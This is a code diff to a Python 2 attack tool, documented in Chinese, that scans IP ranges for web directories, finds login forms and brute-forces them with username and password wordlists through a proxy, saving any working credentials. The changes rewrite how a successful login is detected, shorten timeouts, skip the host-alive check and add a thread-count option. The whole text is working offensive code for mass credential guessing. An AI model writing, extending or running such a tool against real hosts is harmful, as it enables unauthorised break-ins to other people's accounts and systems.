@@ -14,6 +14,7 @@ import pyping
 import signal
 from multiprocessing import cpu_count
 from multiprocessing import Pool
+from multiprocessing import Process
 
 #def setArgs():
 
@@ -68,7 +69,7 @@ def genIpSubFromComma(subIpStr):
             else:
                 result += tmp1
         elif '-' in i:
-            tmp2 = genIpSubFromBar()
+            tmp2 = genIpSubFromBar(i)
             if None == tmp2:
                 continue
             else:
@@ -129,30 +130,22 @@ def getDirList(dirs):
     return result
 
 def isLoginSuccess(resp):
-    if 128 > len(resp.text):
-        return False
-
-    actionUrl, cookies, userName, passwd, otherArgs = getLoginFormArgs(resp)
-    if (None != actionUrl and '' != actionUrl) and (None != userName and '' != userName) and (None != passwd and '' != passwd):
-        return False
-    else:
-        return True
-#    sys.stdout.write('function isLoginSuccess...\n')
-    #html = etree.HTML(resp.text)
-    #options = html.xpath('//option')
-    #if 100 < len(options):
-    #    return True
-    #else:
-    #    if resp.headers:
-    #        print resp.headers
-    #    if resp.text is not None:
-    #        print resp.text
-    #    if resp.content is not None:
-    #        print resp.content
-    #    return False
-
-
-    #return False
+    
+    if 0 < len(resp.text):
+        html = etree.HTML(resp.text)
+        forms = html.xpath('//form[contains(@name,"login")]')
+        if 0 >= len(forms):
+            return True
+        else:
+            return False
+    if 0 < len(resp.content):
+        html = etree.HTML(resp.content)
+        forms = html.xpath('//form[contains(@name,"login")]')
+        if 0 >= len(forms):
+            return True
+        else:
+            return False
+    return True 
 
 
 def login(loginThreadConfig, url, cookies, userName, passwd, otherArgs):
@@ -169,6 +162,7 @@ def login(loginThreadConfig, url, cookies, userName, passwd, otherArgs):
                 tmp.update(otherArgs)
                 postData = tmp
 
+                #resp = requests.post(url, headers = header, cookies = cookies ,data = postData, timeout = (3, 10))
                 resp = requests.post(url, headers = header, cookies = cookies ,data = postData)
                 sys.stdout.write(colored('login:' + url + ' username:' + uL + ' passwd:' + pL + '\n', 'white'))
                 if 200 == resp.status_code or 302 == resp.status_code:
@@ -199,7 +193,6 @@ def getLoginFormArgs(resp):
     if 1 <= len(tmp):
         lang = tmp[0]
 
-#    forms = html.xpath('//form[contains(@name,"login")]')
 
     actionUrl = ''
     tmp = html.xpath('//form[contains(@name,"login") or contains(@id, "login")]/@action')
@@ -257,9 +250,9 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
     loginThreadConfig['out'] = bruteDirThreadConfig['out']
     loginThreadConfig['fc'] = bruteDirThreadConfig['fc']
 
-    if False == isHostLiving(ipLine):
-        return
-
+#    if False == isHostLiving(ipLine):
+#        return
+#
     for dirItem in dirList:
         
         if '/' != dirItem[0]: 
@@ -271,7 +264,7 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
             url = url + '/'
 
         try:
-            resp = requests.get(url, timeout = (3, 15))
+            resp = requests.get(url, timeout = (1, 3))
             if 200 == resp.status_code:
                 with open(bruteDirThreadConfig['surl'], 'a') as surlFile:
                     surlFile.writelines(url + '\n')
@@ -281,7 +274,6 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
                 isHttps = False
                 try:
                     actionUrl, cookies, userName, passwd, otherArgs = getLoginFormArgs(resp)
-                    #sys.stdout.write('--->Line232\n')
                     if (None != actionUrl and '' != actionUrl) and (None != userName and '' != userName) and (None != passwd and '' != passwd):
                         if 'http://' != actionUrl[0:7]:
                             if '/' != actionUrl[0]:
@@ -296,7 +288,7 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
 
                         #login(actionUrl, cookies, userName, passwd, otherArgs)
                     else:
-                        sys.stdout.write('--->Line238 actionUrl: ' + actionUrl + ' userName: ' +  userName + ' passwd: '+ passwd + '\n')
+                        sys.stdout.write(colored('actionUrl: ' + actionUrl + ' userName: ' +  userName + ' passwd: '+ passwd + '\n', 'red'))
                 except Exception, e:
                     sys.stdout.write(str(e) + '\n')
                 break
@@ -316,7 +308,7 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
             urls = urls + '/'
         
         try:
-            resp = requests.get(urls)
+            resp = requests.get(urls, timeout = (1, 3))
             if 200 == resp.status_code:
                 with open(bruteDirThreadConfig['surl'], 'a') as surlFile:
                     surlFile.writelines(urls + '\n')
@@ -337,6 +329,8 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
                         t.start()
                         t.join()
                         login(actionUrl, cookies, userName, passwd, otherArgs)
+                    else:
+                        sys.stdout.write(colored('actionUrl: ' + actionUrl + ' userName: ' +  userName + ' passwd: '+ passwd + '\n', 'red'))
                 except Exception, e:
                     sys.stdout.write(str(e) + '\n')
                 break
@@ -378,11 +372,12 @@ def subWorkers(cpuCnt, subIpList, dirList, bruteDirThreadConfig):
 #    except Exception, e:
 #        sys.stdout.write(str(e) + '\n')
 #    return
+    
+    if bruteDirThreadConfig['tn'] > cpuCnt:
+        cpuCnt = bruteDirThreadConfig['tn']
 
     times = len(subIpList) / cpuCnt
     lastTimeCnt = len(subIpList) % cpuCnt
-
-    
 
     if 0 < lastTimeCnt:
         times += 1
@@ -392,8 +387,10 @@ def subWorkers(cpuCnt, subIpList, dirList, bruteDirThreadConfig):
             for c in range(cpuCnt):
                 try:
                     ipLine = subIpList.pop(0)
+#                    sys.stdout.write('to scan ip: ' + ipLine + '\n')
+
                     thread = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
-                    thread.setDaemon(True)
+                    #thread.setDaemon(True)
                     thread.start()
                     thread.join()
                 except Exception, e:
@@ -402,8 +399,10 @@ def subWorkers(cpuCnt, subIpList, dirList, bruteDirThreadConfig):
             for t in range(lastTimeCnt):
                 try:
                     ipLine = subIpList.pop(0)
+#                    sys.stdout.write('to scan ip:' + ipLine + '\n')
+
                     thread = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
-                    thread.setDaemon(True)
+                    #thread.setDaemon(True)
                     thread.start()
                     thread.join()
                 except Exception, e:
@@ -413,6 +412,9 @@ def subWorkers(cpuCnt, subIpList, dirList, bruteDirThreadConfig):
 
 
 if __name__ == '__main__':
+    cpuCnt = cpu_count()
+    ipsf = ''
+    ipList = []
     
     parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, description='使用说明')
     parser.add_argument('-ipsf', help='指定目标ip 目标域名 目标ip:端口 目标域名:端口记录文件')
@@ -422,9 +424,9 @@ if __name__ == '__main__':
                                     help='爆破路径的字典文件.(默认: config/dirs-lists/comment-dirs.txt)')
 
     parser.add_argument('-users', default = "configs/users-lists/users-list.txt",
-                                    help='指定爆破登录时所用的用户名字典文件(默认: config/users-list/comment-users.txt)')
+                                    help='指定爆破登录时所用的用户名字典文件(默认: config/users-list/users-list.txt)')
 
-    parser.add_argument('-passwds', default = "configs/passwds-lists/top1001-password.txt",
+    parser.add_argument('-passwds', default = "configs/passwds-lists/comment-passwds.txt",
                                     help='指定爆破登录时所使用的密码字典文件.(默认: config/passwds-lists/comment-passwds.txt)')
 
     parser.add_argument('-proxy', default = "http://127.0.0.1:8118",
@@ -451,25 +453,13 @@ if __name__ == '__main__':
 
     parser.add_argument('-fc', default='exit', choices=['exit', 'continue'],
                                     help='指定是否在爆破出一个用户名密码对之后就立即停止该ip的爆破')
+    
+    parser.add_argument('-tn', default=cpuCnt, type=int,
+                                    help='指定线程数')
 #    parser.add_argument('-statCode', help='指定成功返回登录界面的状态码参数. (默认: 200)')
 #    parser.add_argument('-StatCode', help='指定成功返回登录界面时的状态码文件。 (默认: 无)')
 
     args = parser.parse_args()
-
-    ipsf = ''
-    ipList = []
-
-#    dirs = "configs/dirs-lists/dir-list.txt"
-#    users = "configs/users-lists/users-list.txt"
-#    passwds = "configs/passwds-lists/top1001-password.txt"
-#    proxy = "http://127.0.0.1:8118"
-#    success = "configs/success-list/comment-success.txt"
-#    failed = "configs/failed-lists/comment-failed.txt"
-#    out = "default-res.txt"
-#    surl = "success-urls.txt"
-#    ca = 'y'
-#    statCode = '200,301'
-#    StatCode = ''
 
 
     if args.ipsf is None and args.ipsb is None:
@@ -492,48 +482,15 @@ if __name__ == '__main__':
         ipsb = args.ipsb
         ipList = genIpList(ipsb)
 
-#    if args.dirs:
-#        dirs = args.dirs
-#
-#    if args.users:
-#        users =args.users
-#
-#    if args.passwds:
-#        passwds = args.passwds
-#
-#    if args.proxy:
-#        proxy = args.proxy
-#
-#    if args.success:
-#        success = args.success
-#
-#    if args.failed:
-#        failed = args.failed
-#
-#    if args.out:
-#        out = args.out
-#
-#    if args.surl:
-#        surl = args.surl
-#
-#    if args.logfile:
-#       logfile = args.logfile
-#
-#    if args.ca:
-#        ca = args.ca
-
-#    if args.statCode:
-#        statCode = args.statCode
-#
-#    if args.StatCode:
-#        StatCode = args.StatCode
+#    print 'scan ip list:'
+#    for i in ipList:
+#        print i
 
     dirList = getDirList(args.dirs)
     
     signal.signal(signal.SIGINT, quit)
     signal.signal(signal.SIGTERM, quit)
 
-    cpuCnt = cpu_count()
     pool = Pool(cpuCnt)
     eachProJobCnt = len(ipList) / cpuCnt
     lastProJobCnt = (len(ipList) / cpuCnt) + (len(ipList) % cpuCnt)
@@ -545,22 +502,30 @@ if __name__ == '__main__':
     bruteDirThreadConfig['surl'] = args.surl
     bruteDirThreadConfig['fc'] = args.fc
     bruteDirThreadConfig['out'] = args.out
-    
-    for cpuIndex in range(cpuCnt):
-        subIpList = []
-        if (cpuCnt - 1) != cpuIndex:
-            for i in range(eachProJobCnt):
-               subIpList.append(ipList.pop(0))
+    bruteDirThreadConfig['tn'] = args.tn
 
-            pool.apply_async(subWorkers, args=(cpuCnt, subIpList, dirList, bruteDirThreadConfig, ))
-            
-        else:
-            for i in range(lastProJobCnt):
-               subIpList.append(ipList.pop(0))
+    if cpuCnt > len(ipList):
+        #proccess = Process(target = subWorkers, args=(cpuCnt, ipList, dirList, bruteDirThreadConfig, ))
+        #proccess.start()
+        #proccess.join()
+        subWorkers(cpuCnt, ipList, dirList, bruteDirThreadConfig)
 
-            pool.apply_async(subWorkers, args=(subIpList, dirList, bruteDirThreadConfig, ))
+    else:
+        for cpuIndex in range(cpuCnt):
+            subIpList = []
+            if (cpuCnt - 1) != cpuIndex:
+                for i in range(eachProJobCnt):
+                   subIpList.append(ipList.pop(0))
 
-    pool.close()
-    pool.join()
+                pool.apply_async(subWorkers, args=(cpuCnt, subIpList, dirList, bruteDirThreadConfig, ))
+                
+            else:
+                for i in range(lastProJobCnt):
+                   subIpList.append(ipList.pop(0))
+
+                pool.apply_async(subWorkers, args=(cpuCnt, subIpList, dirList, bruteDirThreadConfig, ))
+
+        pool.close()
+        pool.join()
 #    while True:
 #        pass
